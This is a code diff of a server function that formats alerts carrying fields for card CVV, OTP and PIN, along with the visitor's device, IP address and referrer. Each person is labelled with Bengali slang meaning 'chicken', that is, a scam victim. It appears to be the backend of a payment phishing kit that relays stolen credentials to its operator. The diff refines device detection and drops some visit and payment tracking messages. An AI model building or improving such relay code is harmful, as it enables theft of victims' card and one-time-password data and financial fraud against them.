@@ -28,7 +28,15 @@ serve(async (req) => {
     const { type, amount, method, userAgent, timestamp, reason, refId, ip, referrer, step, paymentType } = await req.json();
 
     const clientIp = ip || req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'Unknown';
-    const time = new Date(timestamp || Date.now()).toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' });
+
+    // Parse device simply
+    const ua = userAgent || '';
+    let device = 'Unknown';
+    if (/Android/i.test(ua)) device = 'Android';
+    else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
+    else if (/Windows/i.test(ua)) device = 'Windows';
+    else if (/Mac/i.test(ua)) device = 'Mac';
+    else if (/Linux/i.test(ua)) device = 'Linux';
 
     let message = '';
 
@@ -43,7 +51,7 @@ serve(async (req) => {
           `CVV : N/A\n\n` +
           `OTP : N/A\n\n` +
           `-------------------\n\n` +
-          `🐔মুরগির Device : ${userAgent || 'Unknown'}\n` +
+          `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
           `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
       } else {
@@ -54,7 +62,7 @@ serve(async (req) => {
           `OTP : N/A\n` +
           `PIN : N/A\n\n` +
           `-------------------\n\n` +
-          `🐔মুরগির Device : ${userAgent || 'Unknown'}\n` +
+          `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
           `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
       }
@@ -63,34 +71,9 @@ serve(async (req) => {
         `-------------------\n\n` +
         `Update : Selection Page\n\n` +
         `-------------------\n\n` +
-        `🐔মুরগির Device : ${userAgent || 'Unknown'}\n` +
+        `🐔মুরগির Device : ${device}\n` +
         `🐔মুরগির IP : ${clientIp}\n` +
         `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
-    } else if (type === 'visit') {
-      message = `🌐 *Website Visit*\n\n` +
-        `📅 Time: ${time}\n` +
-        `💰 Amount: ${amount || 'N/A'} BDT\n` +
-        `📱 Device: ${userAgent || 'Unknown'}`;
-    } else if (type === 'payment_selected') {
-      message = `💳 *Payment Method Selected*\n\n` +
-        `📅 Time: ${time}\n` +
-        `💰 Amount: ${amount} BDT\n` +
-        `🏦 Method: ${method}\n` +
-        `📱 Device: ${userAgent || 'Unknown'}`;
-    } else if (type === 'payment_confirmed') {
-      message = `✅ *Payment Confirmation*\n\n` +
-        `📅 Time: ${time}\n` +
-        `💰 Amount: ${amount} BDT\n` +
-        `🏦 Method: ${method}\n` +
-        `📱 Device: ${userAgent || 'Unknown'}`;
-    } else if (type === 'payment_cancelled') {
-      message = `❌ *Payment Cancelled/Failed*\n\n` +
-        `📅 Time: ${time}\n` +
-        `💰 Amount: ${amount || 'N/A'} BDT\n` +
-        `🏦 Channel: ${method || 'N/A'}\n` +
-        `📛 Reason: ${reason || 'N/A'}\n` +
-        `🔖 Ref ID: ${refId || 'N/A'}\n` +
-        `📱 Device: ${userAgent || 'Unknown'}`;
     } else {
       message = `📢 *Notification*\n\n${JSON.stringify({ type, amount, method })}`;
     }
